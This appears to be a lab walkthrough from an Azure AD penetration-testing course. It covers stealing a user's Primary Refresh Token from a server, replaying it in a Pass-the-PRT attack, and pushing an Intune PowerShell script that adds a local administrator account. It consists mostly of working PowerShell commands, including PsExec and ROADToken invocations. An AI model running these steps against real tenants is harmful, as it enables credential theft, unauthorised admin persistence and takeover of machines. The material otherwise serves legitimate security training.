## Objective 21 ***Part of - Kill Chain - 2***
```
- Extract PRT of a user from the infradminsrv VM and execute Pass-the-PRT attack.
- Enumerate machines enrolled to Intune.
- If the above user has Intune Administrator or Global Administrator role, execute PowerShell scripts on an on-prem enrolled machine to add an administrative user to that machine.
- Using the credentials of the user you added, PSRemote to the machine and extract credentials from it.
```
- Copy some tools to machines `jumpvm` and after that copy tools to `infradminsrv` machine;
![test](/img/obj21a.png "Enumeration")


```powershell
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student1\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student1\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student1\Documents -Verbose
```
- Request a nonce;
![test](/img/obj21b.png "Enumeration")

```powershell
$TenantId = ""
$URL = "https://login.microsoftonline.com/$TenantId/oath2/token"
$Params = @{
	"URI" = $URL
	"Method" = "POST"
}

$Body = @{
	"grant_type" = "srv_challenge"
}

$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```
- Execute the command with nonce and retrieve PRT;
```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\studentx\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\studentx\SessionExecCommand.exe MichaelBarron C:\Users\Public\studentx\ROADToken.exe <nonce> > C:\Users\Public\studentx\PRT.txt"}
```
![KillChain](/img/prt.png "Kill Chain 2")
- Login to `https://login.microsoftonline.com/login.srf` with retrieved PRT and assign it to as a cookie when logging in as name with `x-ms-RefrestTokenCredential` cookie in the browser Incognito mode on. 
- Go to `Devices -> Scripts` on the Azure Portal and add a script as below;
adduser.ps1
  ```powershell
  # adduser.ps1 script

  $passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
  New-LocalUser -Name studentX -Password $passwd
  Add-LocalGroupMember -Group Administrators -Member studentx
  ```
- Get a reverse shell on the compromised device

![KillChain](/img/obj21c.png "Kill Chain 2")
